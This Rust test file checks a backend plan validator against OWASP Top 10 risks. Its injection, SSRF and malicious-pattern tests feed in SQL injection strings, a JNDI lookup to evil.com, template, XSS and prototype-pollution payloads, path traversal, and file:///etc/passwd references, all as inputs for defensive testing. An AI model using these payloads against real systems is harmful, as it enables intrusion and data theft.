use scribe_backend::{
    services::{
        planning::{
            PlanValidatorService,
            types::*,
        },
        EcsEntityManager,
    },
    test_helpers::{spawn_app, TestDataGuard, db::create_test_user},
    PgPool,
};
use std::sync::Arc;
use uuid::Uuid;

/// Helper to create test entity manager
async fn create_test_entity_manager(db_pool: PgPool) -> Arc<EcsEntityManager> {
    let redis_client = Arc::new(
        redis::Client::open("redis://127.0.0.1:6379/")
            .expect("Failed to create Redis client for tests")
    );
    
    Arc::new(EcsEntityManager::new(
        db_pool.into(),
        redis_client,
        None,
    ))
}

/// Helper to create entities for different users
async fn create_multi_user_entities(
    entity_manager: &Arc<EcsEntityManager>,
    db_pool: &PgPool,
) -> (Uuid, Uuid, Uuid, Uuid, Uuid, Uuid) {
    // Create test users first
    let user1 = create_test_user(db_pool, "test_user1".to_string(), "password123".to_string()).await.unwrap();
    let user2 = create_test_user(db_pool, "test_user2".to_string(), "password123".to_string()).await.unwrap();
    let user1_id = user1.id;
    let user2_id = user2.id;
    // User 1 entities
    let user1_character_result = entity_manager.create_entity(
        user1_id,
        Some(Uuid::new_v4()),
        "Name|Inventory|Salience".to_string(),
        vec![
            ("Name".to_string(), serde_json::json!({"name": "User1Character"})),
            ("Inventory".to_string(), serde_json::json!({"items": [], "capacity": 10})),
            ("Salience".to_string(), serde_json::json!({"tier": "Core", "scale_context": "character", "expiry": null})),
        ],
    ).await.unwrap();
    
    let user1_location_result = entity_manager.create_entity(
        user1_id,
        Some(Uuid::new_v4()),
        "Name|Salience".to_string(),
        vec![
            ("Name".to_string(), serde_json::json!({"name": "User1Location"})),
            ("Salience".to_string(), serde_json::json!({"tier": "Secondary", "scale_context": "location", "expiry": null})),
        ],
    ).await.unwrap();
    
    // User 2 entities
    let user2_character_result = entity_manager.create_entity(
        user2_id,
        Some(Uuid::new_v4()),
        "Name|Inventory|Salience".to_string(),
        vec![
            ("Name".to_string(), serde_json::json!({"name": "User2Character"})),
            ("Inventory".to_string(), serde_json::json!({"items": [], "capacity": 10})),
            ("Salience".to_string(), serde_json::json!({"tier": "Core", "scale_context": "character", "expiry": null})),
        ],
    ).await.unwrap();
    
    let user2_location_result = entity_manager.create_entity(
        user2_id,
        Some(Uuid::new_v4()),
        "Name|Salience".to_string(),
        vec![
            ("Name".to_string(), serde_json::json!({"name": "User2Location"})),
            ("Salience".to_string(), serde_json::json!({"tier": "Secondary", "scale_context": "location", "expiry": null})),
        ],
    ).await.unwrap();
    
    (user1_character_result.entity.id, user1_location_result.entity.id, 
     user2_character_result.entity.id, user2_location_result.entity.id, user1_id, user2_id)
}

#[tokio::test]
async fn test_a01_broken_access_control_cross_user_entity_access() {
    // A01: Broken Access Control
    // Ensure users cannot create plans that manipulate other users' entities
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let (_, _, user2_character, user2_location, user1_id, _) = 
        create_multi_user_entities(&entity_manager, &test_app.db_pool).await;
    
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);
    
    // User1 tries to move User2's character
    let malicious_plan = Plan {
        goal: "User1 moves User2's character".to_string(),
        actions: vec![
            PlannedAction {
                id: "malicious_step".to_string(),
                name: ActionName::MoveEntity,
                parameters: serde_json::json!({
                    "entity_to_move": user2_character.to_string(),
                    "new_parent": user2_location.to_string(),
                }),
                preconditions: Preconditions {
                    entity_exists: Some(vec![
                        EntityExistenceCheck {
                            entity_id: Some(user2_character.to_string()),
                            entity_name: None,
                        },
                    ]),
                    ..Default::default()
                },
                effects: Effects::default(),
                dependencies: vec![],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(10),
            confidence: 0.9,
            alternative_considered: None,
        },
    };
    
    let result = validator.validate_plan(&malicious_plan, user1_id).await.unwrap();
    
    match result {
        PlanValidationResult::Valid(_) => {
            panic!("Expected invalid plan due to access control violation");
        }
        PlanValidationResult::Invalid(invalid) => {
            assert!(!invalid.failures.is_empty());
            // Should fail because user1 cannot access user2's entities
            assert!(invalid.failures.iter().any(|f| 
                f.failure_type == ValidationFailureType::EntityNotFound ||
                f.failure_type == ValidationFailureType::PermissionDenied
            ));
        }
        PlanValidationResult::RepairableInvalid(_) => {
            panic!("Expected standard invalid plan, not repairable invalid plan");
        }
    }
}

#[tokio::test]
async fn test_a01_broken_access_control_permission_boundaries() {
    // A01: Additional test for permission boundaries
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    
    // Create users first
    let user = create_test_user(&test_app.db_pool, "regular_user".to_string(), "password123".to_string()).await.unwrap();
    let admin = create_test_user(&test_app.db_pool, "admin_user".to_string(), "password123".to_string()).await.unwrap();
    let user_id = user.id;
    let admin_id = admin.id;
    
    // Create admin-only entity
    let admin_entity_result = entity_manager.create_entity(
        admin_id,
        Some(Uuid::new_v4()),
        "Name|Salience".to_string(),
        vec![
            ("Name".to_string(), serde_json::json!({"name": "AdminOnlyEntity"})),
            ("Salience".to_string(), serde_json::json!({"tier": "Core", "scale_context": "admin", "expiry": null})),
        ],
    ).await.unwrap();
    let admin_entity = admin_entity_result.entity.id;
    
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);
    
    // Regular user tries to update admin entity
    let plan = Plan {
        goal: "User tries to modify admin entity".to_string(),
        actions: vec![
            PlannedAction {
                id: "step1".to_string(),
                name: ActionName::UpdateEntity,
                parameters: serde_json::json!({
                    "entity_id": admin_entity.to_string(),
                    "component_operations": [{
                        "operation": "update",
                        "component_type": "Name",
                        "component_data": {"name": "Hacked!"}
                    }]
                }),
                preconditions: Preconditions {
                    entity_exists: Some(vec![
                        EntityExistenceCheck {
                            entity_id: Some(admin_entity.to_string()),
                            entity_name: None,
                        }
                    ]),
                    ..Default::default()
                },
                effects: Effects::default(),
                dependencies: vec![],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(5),
            confidence: 0.95,
            alternative_considered: None,
        },
    };
    
    let result = validator.validate_plan(&plan, user_id).await.unwrap();
    
    match result {
        PlanValidationResult::Valid(_) => {
            panic!("Expected invalid plan due to permission boundary violation");
        }
        PlanValidationResult::Invalid(_) => {
            // Plan should be rejected due to access control
        }
        PlanValidationResult::RepairableInvalid(_) => {
            panic!("Expected standard invalid plan, not repairable invalid plan");
        }
    }
}

#[tokio::test]
async fn test_a03_injection_sql_injection_in_entity_names() {
    // A03: Injection
    // Test SQL injection attempts in entity names/parameters
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "test_user_injection".to_string(), "password123".to_string()).await.unwrap();
    let user_id = user.id;
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);
    
    // SQL injection attempts in various fields
    let injection_attempts = vec![
        "'; DROP TABLE entities; --",
        "' OR '1'='1",
        "'; DELETE FROM components WHERE '1'='1'; --",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
    ];
    
    for injection in injection_attempts {
        let plan = Plan {
            goal: format!("Test with injection: {}", injection),
            actions: vec![
                PlannedAction {
                    id: "injection_test".to_string(),
                    name: ActionName::FindEntity,
                    parameters: serde_json::json!({
                        "criteria": {
                            "type": "ByName",
                            "name": injection
                        }
                    }),
                    preconditions: Preconditions {
                        entity_exists: Some(vec![
                            EntityExistenceCheck {
                                entity_id: None,
                                entity_name: Some(injection.to_string()),
                            }
                        ]),
                        ..Default::default()
                    },
                    effects: Effects::default(),
                    dependencies: vec![],
                }
            ],
            metadata: PlanMetadata {
                estimated_duration: Some(10),
                confidence: 0.5,
                alternative_considered: None,
            },
        };
        
        // Should not panic or allow injection
        let result = validator.validate_plan(&plan, user_id).await;
        assert!(result.is_ok(), "Validator should handle injection attempts safely");
    }
}

#[tokio::test]
async fn test_a03_injection_json_injection_in_parameters() {
    // A03: JSON injection in parameters
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "test_user_json_injection".to_string(), "password123".to_string()).await.unwrap();
    let user_id = user.id;
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);
    
    // Malformed JSON that could break parsing
    let plan = Plan {
        goal: "Test JSON injection".to_string(),
        actions: vec![
            PlannedAction {
                id: "json_injection".to_string(),
                name: ActionName::CreateEntity,
                parameters: serde_json::json!({
                    "entity_name": "Test",
                    "archetype_signature": "Name",
                    "salience_tier": "Core",
                    "malicious": {"$ref": "#/definitions/bomb"},
                    "__proto__": {"isAdmin": true}
                }),
                preconditions: Preconditions::default(),
                effects: Effects::default(),
                dependencies: vec![],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(10),
            confidence: 0.5,
            alternative_considered: None,
        },
    };
    
    let result = validator.validate_plan(&plan, user_id).await;
    assert!(result.is_ok(), "Should handle malformed JSON gracefully");
}

#[tokio::test]
async fn test_a04_insecure_design_plan_complexity_limits() {
    // A04: Insecure Design
    // Test protection against overly complex plans that could DoS the system
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "test_user_complexity".to_string(), "password123".to_string()).await.unwrap();
    let user_id = user.id;
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);
    
    // Create a plan with excessive actions
    let mut actions = Vec::new();
    for i in 0..1000 {
        actions.push(PlannedAction {
            id: format!("step{}", i),
            name: ActionName::FindEntity,
            parameters: serde_json::json!({"criteria": {"type": "ByName", "name": "Test"}}),
            preconditions: Preconditions::default(),
            effects: Effects::default(),
            dependencies: if i > 0 { vec![format!("step{}", i-1)] } else { vec![] },
        });
    }
    
    let complex_plan = Plan {
        goal: "Overly complex plan".to_string(),
        actions,
        metadata: PlanMetadata {
            estimated_duration: Some(10000),
            confidence: 0.1,
            alternative_considered: None,
        },
    };
    
    // Should handle large plans without crashing
    let start = std::time::Instant::now();
    let result = validator.validate_plan(&complex_plan, user_id).await;
    let duration = start.elapsed();
    
    assert!(result.is_ok());
    assert!(duration.as_secs() < 5, "Validation should complete in reasonable time");
}

#[tokio::test]
async fn test_a05_security_misconfiguration_error_information_leakage() {
    // A05: Security Misconfiguration
    // Ensure error messages don't leak sensitive information
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "test_user_error_leakage".to_string(), "password123".to_string()).await.unwrap();
    let user_id = user.id;
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);
    
    // Try to access non-existent entity with revealing name
    let secret_id = Uuid::new_v4();
    let plan = Plan {
        goal: "Access secret entity".to_string(),
        actions: vec![
            PlannedAction {
                id: "step1".to_string(),
                name: ActionName::GetEntityDetails,
                parameters: serde_json::json!({
                    "entity_id": secret_id.to_string(),
                }),
                preconditions: Preconditions {
                    entity_exists: Some(vec![
                        EntityExistenceCheck {
                            entity_id: Some(secret_id.to_string()),
                            entity_name: Some("AdminSecretKey".to_string()),
                        }
                    ]),
                    ..Default::default()
                },
                effects: Effects::default(),
                dependencies: vec![],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(5),
            confidence: 0.9,
            alternative_considered: None,
        },
    };
    
    let result = validator.validate_plan(&plan, user_id).await.unwrap();
    
    match result {
        PlanValidationResult::Invalid(invalid) => {
            for failure in &invalid.failures {
                // Error messages should be generic, not revealing entity names
                assert!(!failure.message.contains("AdminSecretKey"));
                assert!(!failure.message.contains("secret"));
            }
        }
        _ => panic!("Expected invalid plan"),
    }
}

#[tokio::test]
async fn test_a07_authentication_failures_user_context_validation() {
    // A07: Identification and Authentication Failures
    // Ensure user context is properly validated
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);
    
    // Invalid user ID (all zeros - often indicates uninitialized)
    let invalid_user_id = Uuid::nil();
    
    let plan = Plan {
        goal: "Test with invalid user".to_string(),
        actions: vec![
            PlannedAction {
                id: "step1".to_string(),
                name: ActionName::CreateEntity,
                parameters: serde_json::json!({
                    "entity_name": "Test",
                    "archetype_signature": "Name",
                    "salience_tier": "Core",
                }),
                preconditions: Preconditions::default(),
                effects: Effects::default(),
                dependencies: vec![],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(10),
            confidence: 0.8,
            alternative_considered: None,
        },
    };
    
    // Should handle invalid user gracefully
    let result = validator.validate_plan(&plan, invalid_user_id).await;
    assert!(result.is_ok()); // Won't find any entities for nil user
}

#[tokio::test]
async fn test_a08_data_integrity_plan_validation_consistency() {
    // A08: Software and Data Integrity Failures
    // Ensure plan validation maintains data consistency
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    
    // Create test user
    let user = create_test_user(&test_app.db_pool, "test_user_integrity".to_string(), "password123".to_string()).await.unwrap();
    let user_id = user.id;
    
    let entity_result = entity_manager.create_entity(
        user_id,
        Some(Uuid::new_v4()),
        "Name|Inventory|Salience".to_string(),
        vec![
            ("Name".to_string(), serde_json::json!({"name": "TestEntity"})),
            ("Inventory".to_string(), serde_json::json!({"items": [], "capacity": 1})), // Only 1 slot
            ("Salience".to_string(), serde_json::json!({"tier": "Core", "scale_context": "character", "expiry": null})),
        ],
    ).await.unwrap();
    let entity_id = entity_result.entity.id;
    
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);
    
    // Plan that would violate inventory constraints
    let plan = Plan {
        goal: "Add multiple items exceeding capacity".to_string(),
        actions: vec![
            PlannedAction {
                id: "step1".to_string(),
                name: ActionName::AddItemToInventory,
                parameters: serde_json::json!({
                    "owner_entity_id": entity_id.to_string(),
                    "item_entity_id": Uuid::new_v4().to_string(),
                    "quantity": 5, // Exceeds capacity
                }),
                preconditions: Preconditions {
                    inventory_has_space: Some(InventorySpaceCheck {
                        entity_id: entity_id.to_string(),
                        required_slots: 5, // More than available
                    }),
                    ..Default::default()
                },
                effects: Effects::default(),
                dependencies: vec![],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(10),
            confidence: 0.9,
            alternative_considered: None,
        },
    };
    
    let result = validator.validate_plan(&plan, user_id).await.unwrap();
    
    match result {
        PlanValidationResult::Invalid(invalid) => {
            assert!(invalid.failures.iter().any(|f| 
                f.failure_type == ValidationFailureType::PreconditionNotMet &&
                f.message.contains("inventory")
            ));
        }
        _ => panic!("Expected invalid plan due to data integrity constraints"),
    }
}

#[tokio::test]
async fn test_a09_logging_plan_validation_audit_trail() {
    // A09: Security Logging and Monitoring Failures
    // Ensure validation events are properly logged
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "test_user_audit".to_string(), "password123".to_string()).await.unwrap();
    let user_id = user.id;
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);
    
    // Suspicious plan that should trigger logging
    let suspicious_plan = Plan {
        goal: "Suspicious activity test".to_string(),
        actions: vec![
            PlannedAction {
                id: "suspicious".to_string(),
                name: ActionName::UpdateEntity,
                parameters: serde_json::json!({
                    "entity_id": Uuid::new_v4().to_string(),
                    "component_operations": [{
                        "operation": "remove",
                        "component_type": "Security"
                    }]
                }),
                preconditions: Preconditions::default(),
                effects: Effects::default(),
                dependencies: vec![],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(1),
            confidence: 0.99,
            alternative_considered: Some("Bypass security".to_string()),
        },
    };
    
    // Validation should complete (even if plan is invalid)
    let result = validator.validate_plan(&suspicious_plan, user_id).await;
    assert!(result.is_ok());
    
    // In production, we would verify audit logs contain:
    // - User ID
    // - Plan goal
    // - Validation result
    // - Timestamp
    // - Any security-relevant failures
}

#[tokio::test]
async fn test_a10_ssrf_external_reference_prevention() {
    // A10: Server-Side Request Forgery (SSRF)
    // Ensure plans cannot reference external resources
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "test_user_ssrf".to_string(), "password123".to_string()).await.unwrap();
    let user_id = user.id;
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);
    
    // Plan with potential SSRF vectors
    let ssrf_plan = Plan {
        goal: "SSRF test plan".to_string(),
        actions: vec![
            PlannedAction {
                id: "ssrf_test".to_string(),
                name: ActionName::CreateEntity,
                parameters: serde_json::json!({
                    "entity_name": "http://evil.com/steal-data",
                    "archetype_signature": "Name",
                    "salience_tier": "Core",
                    "webhook_url": "http://internal-server/admin",
                    "external_ref": "file:///etc/passwd",
                }),
                preconditions: Preconditions::default(),
                effects: Effects::default(),
                dependencies: vec![],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(10),
            confidence: 0.8,
            alternative_considered: None,
        },
    };
    
    // Should validate without making external requests
    let result = validator.validate_plan(&ssrf_plan, user_id).await;
    assert!(result.is_ok(), "Should handle SSRF attempts safely");
    
    // The validator itself doesn't make external requests,
    // but it should not process URLs as actual resources
}

#[tokio::test]
async fn test_comprehensive_security_malicious_plan_patterns() {
    // Comprehensive test for various malicious patterns
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "test_user_malicious".to_string(), "password123".to_string()).await.unwrap();
    let user_id = user.id;
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);
    
    // Plan combining multiple attack vectors
    let malicious_plan = Plan {
        goal: "'; DROP TABLE plans; -- <script>alert('xss')</script>".to_string(),
        actions: vec![
            PlannedAction {
                id: "../../../etc/passwd".to_string(),
                name: ActionName::CreateEntity,
                parameters: serde_json::json!({
                    "entity_name": "{{7*7}}${jndi:ldap://evil.com/a}",
                    "archetype_signature": "Name|<img src=x onerror=alert(1)>",
                    "salience_tier": "Core",
                    "extra": {"$ref": "#/definitions/bomb", "__proto__": {"isAdmin": true}}
                }),
                preconditions: Preconditions {
                    entity_exists: Some(vec![
                        EntityExistenceCheck {
                            entity_id: Some("' OR '1'='1".to_string()),
                            entity_name: Some("admin' --".to_string()),
                        }
                    ]),
                    ..Default::default()
                },
                effects: Effects {
                    entity_created: Some(EntityCreatedEffect {
                        entity_name: "<iframe src='javascript:alert(1)'></iframe>".to_string(),
                        entity_type: "../../confidential".to_string(),
                        parent_id: Some("0 UNION SELECT * FROM users".to_string()),
                    }),
                    ..Default::default()
                },
                dependencies: vec!["'; DELETE FROM plans WHERE '1'='1'; --".to_string()],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(0),
            confidence: std::f32::INFINITY,
            alternative_considered: Some("1=1/**/OR/**/1=1".to_string()),
        },
    };
    
    // Should handle all attack vectors gracefully
    let result = validator.validate_plan(&malicious_plan, user_id).await;
    
    match result {
        Ok(_) => {
            // Validator processed the plan without security breaches
            // The malicious content is treated as data, not executed
        }
        Err(e) => {
            // Error handling should not reveal system information
            let error_msg = e.to_string();
            assert!(!error_msg.contains("/home/"));
            assert!(!error_msg.contains("\\src\\"));
            assert!(!error_msg.contains("users"));
        }
    }
}